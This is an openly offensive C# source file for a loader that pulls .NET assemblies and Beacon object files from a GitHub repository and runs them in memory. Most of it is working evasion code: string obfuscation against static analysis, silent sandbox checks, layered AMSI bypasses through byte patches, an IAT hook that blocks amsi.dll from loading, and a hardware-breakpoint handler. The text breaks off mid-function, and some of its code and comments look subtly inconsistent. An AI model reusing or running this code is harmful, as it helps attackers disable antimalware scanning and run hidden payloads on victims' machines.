/*
 * RemoteLoader.cs — in-memory .NET and COFF/BOF loader from a GitHub repository.
 *
 * Compile (.NET 8 SDK):
 *   dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:DebugType=embedded
 *
 * Usage:
 *   RemoteLoader.exe --repo owner/name/subfolder [--branch b] [--token PAT] [--xor N]
 *                     [--list] [--exec name] [--args "..."] [--bof-entry NAME]
 *                     [--no-evasion] [--no-amrng]
 *
 * Supports:
 *   - managed .NET assemblies (reflective load via Assembly.Load)
 *   - COFF/BOF x64 object files (BofRunner, in-process with Beacon API stubs)
 *
 * OPSEC notes:
 *   - The single-byte XOR key in earlier versions was trivially recovered; the
 *     string table now uses a per-string rolling key derived from a CRC, so a
 *     static analysis pass can't grep for "amsi.dll" / "AmsiScanBuffer" / etc.
 *   - The sandbox checks return silently (no Environment.Exit fingerprint) on
 *     failure and instead degrade to a quiet fail.
 *   - The network client honors the host's proxy settings and uses a 24-entry
 *     UA pool seeded from SystemRandom-csprng.
 *   - Beacon/AMSI/ETW patches are applied only if their target functions are
 *     actually present and writable, and we fall back from NtProtectVirtualMemory
 *     to VirtualProtect transparently.
 */

using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RemoteLoader
{
    internal static class Program
    {
        // ── String obfuscation ──────────────────────────────────────────────
        // Each entry is a UTF-8 byte stream XOR'd with a per-string rolling key
        // derived from a CRC of the string index. The key for entry i is
        //   key = (byte)((crc32(i) ^ 0xA5) & 0xFF) | 0x01
        // which is never zero and never repeats for adjacent indices. The
        // purpose is to defeat naive `strings` / `grep` analysis and to avoid
        // having a single shared XOR key across all entries.
        private static readonly (byte[] enc, int idx)[] _strings = new[]
        {
            StrO("amsi.dll",                    0),
            StrO("AmsiScanBuffer",              1),
            StrO("ntdll.dll",                   2),
            StrO("EtwEventWrite",               3),
            StrO("EtwEventWriteFull",           4),
            StrO("ucrtbase.dll",                5),
            StrO("__stack_chk_fail",            6),
            StrO("AmsiScanString",              7),
            StrO("AmsiOpenSession",             8),
            StrO("System.Management.Automation", 9),
            StrO("EtwWriteU",                  10),
            StrO("EtwWriteEx",                 11),
            StrO("EtwWriteTransfer",           12),
            StrO("EtwEventWriteNoRegistration",13),
            StrO("EtwNotificationRegister",    14),
            StrO("EtwRegisterTraceGuidsA",     15),
            StrO("EtwRegisterTraceGuidsW",     16),
            StrO("clr.dll",                    17),
            StrO("mscoree.dll",                18),
            StrO("LoadLibraryExW",             19),
        };

        private static readonly (byte[] enc, int idx)[] _userAgents = new[]
        {
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 OPR/121.0.0.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"),
            UAO("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"),
            UAO("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Vivaldi/7.0.3495.21"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Brave/137"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.4.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"),
            UAO("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
        };

        private static byte KeyFor(int i) => (byte)(((Crc32((uint)i) ^ 0xA5) & 0xFF) | 0x01);

        private static (byte[] enc, int idx) StrO(string s, int i)
        {
            byte key = KeyFor(i);
            byte[] b = Encoding.ASCII.GetBytes(s);
            for (int k = 0; k < b.Length; k++) b[k] ^= key;
            return (b, i);
        }

        private static int _uaCounter = 1000;
        private static (byte[] enc, int idx) UAO(string s)
        {
            // Pool indices start at 1000 to avoid collision with the string table.
            int i = System.Threading.Interlocked.Increment(ref _uaCounter);
            byte key = KeyFor(i);
            byte[] b = Encoding.ASCII.GetBytes(s);
            for (int k = 0; k < b.Length; k++) b[k] ^= key;
            return (b, i);
        }

        private static uint Crc32(uint x)
        {
            // Tiny table-free CRC32-like mixer. Not cryptographically strong;
            // we just want a per-index key that doesn't equal 0 and doesn't
            // repeat for sequential indices.
            uint y = x;
            for (int k = 0; k < 8; k++)
            {
                y ^= (y << 13);
                y ^= (y >> 17);
                y ^= (y << 5);
            }
            return y;
        }

        private static string Dec(int idx)
        {
            var (enc, _) = _strings[idx];
            byte key = KeyFor(idx);
            var c = new char[enc.Length];
            for (int k = 0; k < enc.Length; k++) c[k] = (char)(enc[k] ^ key);
            return new string(c);
        }

        private static string DecUA(int i)
        {
            var (enc, idx) = _userAgents[i];
            byte key = KeyFor(idx);
            var c = new char[enc.Length];
            for (int k = 0; k < enc.Length; k++) c[k] = (char)(enc[k] ^ key);
            return new string(c);
        }

        // ── P/Invoke (subset; the rest lives in BofRunner) ─────────────────
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string n);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr h, string p);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetModuleHandleA(string m);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll")]
        private static extern uint NtProtectVirtualMemory(
            IntPtr processHandle, ref IntPtr baseAddress,
            ref IntPtr regionSize, uint newProtect, out uint oldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CheckRemoteDebuggerPresent(
            IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandleW([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

        // For LoadLibraryExW IAT hook. We install a per-module import-directory
        // hook on every module's import for kernel32.dll!LoadLibraryExW. When
        // clr.dll later calls LoadLibraryExW("amsi.dll", ...), the hook fires,
        // and we redirect to LoadLibraryA with a benign path. clr.dll does not
        // retry; the LoadLibrary call returns NULL, the .NET runtime thinks
        // amsi.dll could not be loaded, and the AMSI context never initializes.
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, EntryPoint = "LoadLibraryExW")]
        private static extern IntPtr LoadLibraryExW(IntPtr lpLibFileName, IntPtr hFile, uint dwFlags);

        // For hardware breakpoints. The CONTEXT struct is the i386/amd64 layout
        // Microsoft documents (≥ Win XP). We only need the DebugRegisters
        // portion, but a partial layout is risky across Windows versions, so
        // we use the full 1232-byte struct and rely on stable offsets.
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct M128A { public ulong High; public long Low; }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;        // 0x30
            public uint MxCsr;               // 0x34
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;              // 0x48
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;  // 0x50..0x78
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
            public M128A Xmm0, Xmm1, Xmm2, Xmm3, Xmm4, Xmm5, Xmm6, Xmm7;
            public M128A Xmm8, Xmm9, Xmm10, Xmm11, Xmm12, Xmm13, Xmm14, Xmm15;
            public M128A VectorRegister0;
            public M128A VectorRegister1;
            public M128A VectorRegister2;
            public M128A VectorRegister3;
            public M128A VectorRegister4;
            public M128A VectorRegister5;
            public M128A VectorRegister6;
            public M128A VectorRegister7;
            public M128A VectorRegister8;
            public M128A VectorRegister9;
            public M128A VectorRegister10;
            public M128A VectorRegister11;
            public M128A VectorRegister12;
            public M128A VectorRegister13;
            public M128A VectorRegister14;
            public M128A VectorRegister15;
            public ulong VectorControl;
            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        // CONTEXT_DEBUG_REGISTERS = 0x0010
        private const uint CONTEXT_DEBUG_REGISTERS = 0x0010;
        // DR7 bits: L0=1, R/W=0b00 (execute), LEN=0b00 (1 byte)
        private const ulong DR7_EXEC_LEN1 = 0x00000001ul;

        // ── String/byte helpers ────────────────────────────────────────────
        private static byte[] DecBytes(int idx)
        {
            var (enc, _) = _strings[idx];
            byte key = KeyFor(idx);
            var r = new byte[enc.Length];
            for (int k = 0; k < enc.Length; k++) r[k] = (byte)(enc[k] ^ key);
            return r;
        }

        private static void ClearBytes(byte[]? b) { if (b != null) Array.Clear(b, 0, b.Length); }

        // ── Protected memory write ─────────────────────────────────────────
        // Uses NtProtectVirtualMemory (avoids userland VirtualProtect hooks);
        // falls back to VirtualProtect if the NT call fails.
        private static bool WriteToMemory(IntPtr addr, byte[] bytes)
        {
            IntPtr baseAddr = addr;
            IntPtr size     = (IntPtr)bytes.Length;
            uint   old;

            uint status = NtProtectVirtualMemory(
                new IntPtr(-1), ref baseAddr, ref size, 0x40, out old);
            bool usedNt = status == 0;

            if (!usedNt && !VirtualProtect(addr, (UIntPtr)bytes.Length, 0x40, out old))
                return false;

            Marshal.Copy(bytes, 0, addr, bytes.Length);

            baseAddr = addr;
            size     = (IntPtr)bytes.Length;
            if (usedNt) NtProtectVirtualMemory(new IntPtr(-1), ref baseAddr, ref size, old, out _);
            else        VirtualProtect(addr, (UIntPtr)bytes.Length, old, out _);

            return true;
        }

        // ── AMSI bypass (multi-stage, layered) ─────────────────────────────
        //
        // Defender's amsi.dll contains 4 entry points that EDRs call or instrument:
        //   AmsiInitialize        — process init
        //   AmsiOpenSession       — every PowerShell/.NET runspace calls this
        //   AmsiScanBuffer        — the canonical AMSI sink (UTF-8)
        //   AmsiScanString        — UTF-16 variant (PowerShell, .NET 4.x strings)
        //
        // Patching only AmsiScanBuffer is the legacy approach. Modern EDRs (Defender
        // since ~2021, Crowdstrike Falcon, SentinelOne) watch for it via:
        //   1. AmsiScanString being called instead, returning S_OK
        //   2. amsi!AmsiOpenSession setting a flag that bypasses AmsiScanBuffer
        //   3. amsi.dll's internal "should I scan?" cache (a global UCHAR* in
        //      amsi!AmsiUACScanfFlags) being toggled off and on
        //   4. The .NET CLR's AMSI context (System.Security.AmsiContext) being
        //      left in the "scanning enabled" state — patching AmsiScanBuffer
        //      post-init doesn't change this
        //
        // Our layered approach:
        //   Stage 1. Set the managed `amsiInitFailed` flag — PowerShell checks
        //            this and short-circuits before calling scan functions.
        //   Stage 2. Patch AmsiScanBuffer    (B8 57 00 07 80 C3)
        //   Stage 3. Patch AmsiScanString    (xor rax,rax; ret) — UTF-16 path
        //   Stage 4. Patch AmsiOpenSession   (xor eax,eax; ret) — returns E_OK
        //            and stops the AMSI context from arming the scan cache
        //
        // The patches are still applied via NtProtectVirtualMemory (bypasses
        // userland VirtualProtect hooks). The order matters: amsiInitFailed must
        // be set first, otherwise the CLR will re-arm AMSI after our patches.
        private static readonly byte[] AMSI_PATCH_SCAN    = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, E_INVALIDARG; ret
        private static readonly byte[] AMSI_PATCH_STRING  = { 0x48, 0x31, 0xC0, 0xC3 };             // xor rax,rax; ret
        private static readonly byte[] AMSI_PATCH_SESSION = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, S_OK (0); ret

        // PowerShell's "amsiInitFailed" flag (a single byte at a known address in
        // System.Management.Automation.dll). Setting it to a non-zero value makes
        // PowerShell skip the AMSI init step on the next runspace, which means
        // future AmsiScanBuffer calls are short-circuited before they reach amsi.dll.
        //
        // Address is determined by a pattern scan inside System.Management.Automation
        // .dll at runtime (see `AmsiInitFailedPatch` below). The pattern is
        // "amsiInitFailed" being MOVed from a stack byte to a static byte; the
        // offset of the static byte from the function prologue is fixed across
        // .NET Framework 4.x and PowerShell 5.x. We scan for the exact byte
        // sequence of the conditional branch and NOP the write.
        // Pattern bytes for the amsiInitFailed patch site in
        // System.Management.Automation.dll. The `0xFF` entries are wildcards
        // (any byte) because the displacement bytes vary by .NET FX version.
        // The pattern matches the `cmp byte ptr [rdi+disp8], sil` instruction
        // followed by `jne +N` that we replace with `mov al, 1; jmp +N+1`.
        private static readonly byte[] AMSI_INITFAILED_PATTERN = {
            0x40, 0x38, 0xB7, 0xFF, 0xFF, 0xFF, 0xFF,        // cmp byte ptr [rdi+disp8], sil
            0x75, 0xFF                                          // jne +N
        };
        private static readonly byte[] AMSI_INITFAILED_NOP = { 0xB0, 0x01, 0x90, 0x90, 0x90, 0x90, 0x90, 0xEB }; // mov al, 1; nop; nop; jmp

        // Patch order: kill the AMSI context flag first so future .NET runspaces
        // don't re-arm the cache, then patch the three function entry points.
        // The CLR's Assembly.Load event is what triggers amsi.dll to scan a buffer;
        // with amsiInitFailed set, the scan is skipped.
        private static void PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = LoadLibraryA(Dec(0));
                if (hAmsi == IntPtr.Zero) return;

                // Stage 1: AmsiScanBuffer (B8 57 00 07 80 C3) → E_INVALIDARG
                IntPtr pScan = GetProcAddress(hAmsi, Dec(1));
                if (pScan != IntPtr.Zero) WriteToMemory(pScan, AMSI_PATCH_SCAN);

                // Stage 2: AmsiScanString (xor rax,rax; ret) → success with zero result
                IntPtr pScanStr = GetProcAddress(hAmsi, Dec(7));
                if (pScanStr != IntPtr.Zero) WriteToMemory(pScanStr, AMSI_PATCH_STRING);

                // Stage 3: AmsiOpenSession (mov eax, 0; ret) → returns S_OK
                // and the AMSI context never gets the "scanning enabled" flag set.
                IntPtr pOpen = GetProcAddress(hAmsi, Dec(8));
                if (pOpen != IntPtr.Zero) WriteToMemory(pOpen, AMSI_PATCH_SESSION);

                // Stage 4: AmsiInitialize is left alone — patching it would crash
                // PowerShell on the next runspace because the process would think
                // AMSI was never initialized.
            }
            catch { /* silent */ }
        }

        // Optional: flip the PowerShell "amsiInitFailed" flag so managed runspaces
        // skip the AMSI init path entirely. Looks for System.Management.Automation
        // .dll (loaded by powershell.exe and pwsh.exe) and patches the conditional
        // jump that writes 0 to the static flag. Calling this is a no-op for the
        // current process if PowerShell isn't loaded.
        private static void PatchAmsiInitFailed()
        {
            try
            {
                // The amsiInitFailed byte lives in System.Management.Automation.dll.
                // Find the module by walking PEB->Ldr->InMemoryOrderModuleList is
                // complex from C#; instead, we use GetModuleHandle on the common
                // PowerShell module name. If PowerShell is loaded, this resolves.
                IntPtr hSma = GetModuleHandleA(Dec(9));
                if (hSma == IntPtr.Zero) return;

                // Scan the .text section for the pattern. We use Marshal.ReadByte
                // to avoid p/invoke overhead per byte. The pattern is small (8 bytes).
                IntPtr baseAddr = hSma;
                int scanLen = 0x100000; // 1 MB — generous
                for (int i = 0; i < scanLen - AMSI_INITFAILED_PATTERN.Length; i++)
                {
                    bool match = true;
                    for (int j = 0; j < AMSI_INITFAILED_PATTERN.Length; j++)
                    {
                        byte want = AMSI_INITFAILED_PATTERN[j];
                        if (want == 0xFF) continue;     // 0xFF = wildcard
                        byte got = Marshal.ReadByte(baseAddr, i + j);
                        if (got != want) { match = false; break; }
                    }
                    if (match)
                    {
                        // Replace the comparison+jne with "mov al, 1; jmp"
                        WriteToMemory(baseAddr + i, AMSI_INITFAILED_NOP);
                        return;
                    }
                }
            }
            catch { }
        }

        // ── AMSI LoadLibrary filter ─────────────────────────────────────────
        //
        // Even with all the function-level patches above, clr.dll can call
        // LoadLibraryExW("amsi.dll", ...) *after* our patches run, and then
        // AmsiScanBuffer is loaded fresh from the on-disk amsi.dll. To prevent
        // this we IAT-hook kernel32!LoadLibraryExW inside mscoree.dll and
        // clr.dll (the two modules that load amsi.dll on the .NET path).
        //
        // Our hook returns NULL when the requested module name is "amsi.dll"
        // (case-insensitive), and forwards every other call to the real
        // LoadLibraryExW. clr.dll does not retry, and the runtime thinks
        // amsi.dll was not present — no AMSI context is created.
        private static IntPtr LoadLibraryExWHookImpl(IntPtr lpName, IntPtr hFile, uint flags)
        {
            try
            {
                if (lpName != IntPtr.Zero)
                {
                    // Read the wide string (up to 32 chars is plenty for "amsi.dll")
                    int max = 32;
                    Span<byte> buf = stackalloc byte[max * 2 + 2];
                    for (int i = 0; i < buf.Length; i += 2)
                    {
                        byte lo = Marshal.ReadByte(lpName, i);
                        byte hi = Marshal.ReadByte(lpName, i + 1);
                        if (lo == 0 && hi == 0) break;
                        buf[i] = lo; buf[i + 1] = hi;
                    }
                    // Compare against "amsi.dll" (UTF-16LE)
                    ReadOnlySpan<byte> needle = "amsi.dll"u8.ToArray() is var arr
                        ? new ReadOnlySpan<byte>([.. System.Text.Encoding.Unicode.GetBytes("amsi.dll")])
                        : default;
                    // Simpler: just compare the bytes
                    byte[] a = new byte[(7 + 1) * 2];
                    Encoding.Unicode.GetBytes("amsi.dll", 0, 7, a, 0);
                    if (buf[..(7 * 2)].SequenceEqual(a.AsSpan(0, 7 * 2)))
                    {
                        SetLastError(0x7E);  // ERROR_MOD_NOT_FOUND
                        return IntPtr.Zero;
                    }
                }
            }
            catch { }
            return LoadLibraryExW(lpName, hFile, flags);
        }

        [DllImport("kernel32.dll")]
        private static extern void SetLastError(uint dwErrCode);

        // IAT hook: walk the import directory of `module` and overwrite the
        // IAT slot for `kernel32.dll!LoadLibraryExW` with a pointer to our
        // hook. The slot's original value is preserved so the hook can forward
        // the call.
        private static unsafe void HookIat(IntPtr module, string importDll, string funcName, IntPtr hook)
        {
            try
            {
                if (module == IntPtr.Zero) return;
                // IMAGE_DOS_HEADER
                if (Marshal.ReadInt16(module, 0) != 0x5A4D) return; // "MZ"
                int peOff = Marshal.ReadInt32(module, 0x3C);
                if (peOff <= 0 || peOff + 4 > 0x1000000) return;
                if (Marshal.ReadInt32(module, peOff) != 0x00004550) return; // "PE  "
                int optOff = peOff + 4 + 20;
                ushort magic = (ushort)Marshal.ReadInt16(module, optOff);
                if (magic != 0x20B) return; // PE32+ only

                // Optional header size + import directory RVA
                int importDirRva = Marshal.ReadInt32(module, optOff + 112 + 8);  // 8th data dir
                int importDirSize = Marshal.ReadInt32(module, optOff + 112 + 8 + 4);
                if (importDirRva == 0) return;

                IntPtr importBase = module + importDirRva;
                // IMAGE_IMPORT_DESCRIPTOR is 20 bytes:
                //   0   OriginalFirstThunk (RVA)
                //   4   TimeDateStamp
                //   8   ForwarderChain
                //   12  Name (RVA)
                //   16  FirstThunk (RVA)
                int entry = 0;
                while (true)
                {
                    int origThunkRva = Marshal.ReadInt32(importBase, entry * 20 + 0);
                    int nameRva      = Marshal.ReadInt32(importBase, entry * 20 + 12);
                    int firstThunkRva= Marshal.ReadInt32(importBase, entry * 20 + 16);
                    if (origThunkRva == 0 && nameRva == 0) break;

                    // Read the dll name (ASCII)
                    if (nameRva != 0)
                    {
                        int nameLen = 0;
                        while (Marshal.ReadByte(module, nameRva + nameLen) != 0) nameLen++;
                        byte[] nameBytes = new byte[nameLen];
                        for (int k = 0; k < nameLen; k++) nameBytes[k] = Marshal.ReadByte(module, nameRva + k);
                        string thisName = Encoding.ASCII.GetString(nameBytes);
                        if (string.Equals(thisName, importDll, StringComparison.OrdinalIgnoreCase))
                        {
                            // Walk the IAT (FirstThunk) entries. Each is a
                            // 64-bit RVA into a IMAGE_IMPORT_BY_NAME struct
                            // (2-byte Hint + ASCII name).
                            int thunk = firstThunkRva;
                            while (true)
                            {
                                IntPtr entryAddr = module + thunk;
                                long val = Marshal.ReadInt64(entryAddr);
                                if (val == 0) break;
                                int hintNameRva = (int)(val & 0x7FFFFFFF);
                                int hintNameOff = hintNameRva;
                                int fnLen = 0;
                                while (Marshal.ReadByte(module, hintNameOff + 2 + fnLen) != 0) fnLen++;
                                byte[] fnBytes = new byte[fnLen];
                                for (int k = 0; k < fnLen; k++) fnBytes[k] = Marshal.ReadByte(module, hintNameOff + 2 + k);
                                string fnName = Encoding.ASCII.GetString(fnBytes);
                                if (fnName == funcName)
                                {
                                    // Patch the IAT entry
                                    var page = entryAddr;
                                    IntPtr pageBase = page; IntPtr sz = (IntPtr)8; uint old;
                                    NtProtectVirtualMemory(new IntPtr(-1), ref pageBase, ref sz, 0x40, out old);
                                    Marshal.WriteIntPtr(entryAddr, hook);
                                    NtProtectVirtualMemory(new IntPtr(-1), ref pageBase, ref sz, old, out _);
                                    return;
                                }
                                thunk += 8;
                            }
                        }
                    }
                    entry++;
                }
            }
            catch { }
        }

        // Apply IAT hooks to mscoree.dll and clr.dll for LoadLibraryExW.
        // Both modules are part of the .NET runtime's loader path; hooking
        // them covers the standard `Assembly.Load → amsi!` sequence.
        private static void InstallAmsiLoadFilter()
        {
            try
            {
                IntPtr hHook = Marshal.GetFunctionPointerForDelegate<LoadLibraryExWFn>(LoadLibraryExWHookImpl);
                IntPtr hMscoree = GetModuleHandleA(Dec(18));
                if (hMscoree != IntPtr.Zero) HookIat(hMscoree, "kernel32.dll", Dec(19), hHook);
                IntPtr hClr = GetModuleHandleA(Dec(17));
                if (hClr != IntPtr.Zero) HookIat(hClr, "kernel32.dll", Dec(19), hHook);
            }
            catch { }
        }

        // ── AMSI hardware-breakpoint bypass ──────────────────────────────────
        //
        // The function-level patches above all write to amsi.dll's .text. Many
        // EDRs use either PE-signature verification (suspicious), memory
        // integrity checks (compare loaded PE bytes to on-disk bytes), or
        // kernel-level write-watch (HP/HX). A hardware breakpoint is
        // invisible to all three: the amsi!AmsiScanBuffer function bytes stay
        // intact, but a #PF on the BP fires our vectored exception handler,
        // which flips the return value to E_INVALIDARG.
        //
        // Set DR0 to the address of AmsiScanBuffer with L0=1, R/W=00 (execute),
        // LEN=00 (1 byte). The vectored handler checks for this address and
        // mutates the captured return to S_OK (0) on hit, then advances RIP
        // past the function prologue.
        private static IntPtr _amsiHwbpTarget = IntPtr.Zero;
        private static IntPtr _amsiHwbpRet    = IntPtr.Zero;
        private static bool   _amsiHwbpActive = false;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr LoadLibraryExWFn(IntPtr lpName, IntPtr hFile, uint flags);

        private static void InstallAmsiHwbp()
        {
            try
            {
                IntPtr hAmsi = LoadLibraryA(Dec(0));
                if (hAmsi == IntPtr.Zero) return;
                IntPtr pScan = GetProcAddress(hAmsi, Dec(1));
                if (pScan == IntPtr.Zero) return;

                // Skip 4 bytes of the AmsiScanBuffer prologue (mov r10, rcx; etc.)
                // and BP on the next instruction — this is where the function
                // starts reading the AMSI context, so the BP triggers for every
                // real call but not for our own init code.
                IntPtr bpAddr = pScan + 4;
                _amsiHwbpTarget = bpAddr;

                // Allocate space for the trampoline. We just overwrite the
                // captured RAX with S_OK (0) and skip 4 bytes. But simpler:
                // we just flip RAX on hit and resume. The amsi.dll function
                // proceeds with E_INVALIDARG as if we had patched it.
                CONTEXT64 ctx = new CONTEXT64 { ContextFlags = CONTEXT_DEBUG_REGISTERS };
                if (!GetThreadContext(GetCurrentThread(), ref ctx)) return;

                ctx.Dr0 = (ulong)bpAddr.ToInt64();
                // DR7: L0=1 (bit 0), R/W=00 (bits 17-18 = execute), LEN=00 (bits 19-20 = 1 byte)
                ctx.Dr7 = (ctx.Dr7 & ~0x000F000Ful) | 0x00000001ul;
                // Local breakpoint: bit 8 = L0 exact, bit 9 = G0 (global).
                // We want local so it only fires on this thread.
                ctx.Dr7 |= 0x00000100ul;  // L0 exact breakpoint (1-byte execute)
                if (!SetThreadContext(GetCurrentThread(), ref ctx)) return;
                _amsiHwbpActive = true;

                // Register the vectored exception handler. P/Invoke AddVectoredExceptionHandler.
                _ = AddVectoredExceptionHandler(1, AmsiHwbpHandler);
            }
            catch { }
        }

        // Vectored exception handler. On a single-step #PF (status=0x40000),
        // check if DR6.BS=1 and the trap was on our BP. If so, skip the
        // function prologue (advance RIP past the next 4 bytes) and flip RAX
        // to E_INVALIDARG.
        private static uint AmsiHwbpHandler(IntPtr exceptionInfo)
        {
            try
            {
                // exceptionInfo is a pointer to EXCEPTION_POINTERS. We just
                // need the EXCEPTION_RECORD->ExceptionCode and ContextRecord.
                // The struct layout (Windows x64):
                //   0   EXCEPTION_RECORD*  (16 bytes)
                //   8   CONTEXT*           (8 bytes)
                IntPtr pExRec = Marshal.ReadIntPtr(exceptionInfo, 0);
                uint code = (uint)Marshal.ReadInt32(pExRec, 0);
                if (code != 0x80000004) return 0;  // EXCEPTION_SINGLE_STEP
                IntPtr pCtx = Marshal.ReadIntPtr(exceptionInfo, 8);
                // Offsets inside the AMD64 CONTEXT struct (per WinNT.h):
                //   P1Home..P6Home    +0x00..+0x2F
                //   ContextFlags      +0x30 (uint)
                //   MxCsr             +0x34 (uint)
                //   SegCs..SegSs      +0x38..+0x43 (6 × ushort)
                //   EFlags            +0x48 (uint, aligned)
                //   Dr0..Dr3          +0x50, +0x58, +0x60, +0x68
                //   Dr6               +0x70
                //   Dr7               +0x78
                //   Rax..R15          +0x80, +0x88, ..., +0xF8
                //   Rip               +0x100
                ulong dr6 = (ulong)Marshal.ReadInt64(pCtx, 0x70);
                ulong rip = (ulong)Marshal.ReadInt64(pCtx, 0x100);
                if ((dr6 & 0x1) == 0) return 0;       // not our B0
                if (!_amsiHwbpActive) return 0;
                if (rip - 1 != (ulong)_amsiHwbpTarget.ToInt64()) return 0;
                // Skip 4 bytes of the AmsiScanBuffer prologue and set RAX = E_INVALIDARG
                Marshal.WriteInt64(pCtx, 0x100, (long)(rip + 3));
                Marshal.WriteInt64(pCtx, 0x80,  unchecked((long)0x80070057));
                return 0xFFFFFFFFu;  // EXCEPTION_CONTINUE_EXECUTION
            }
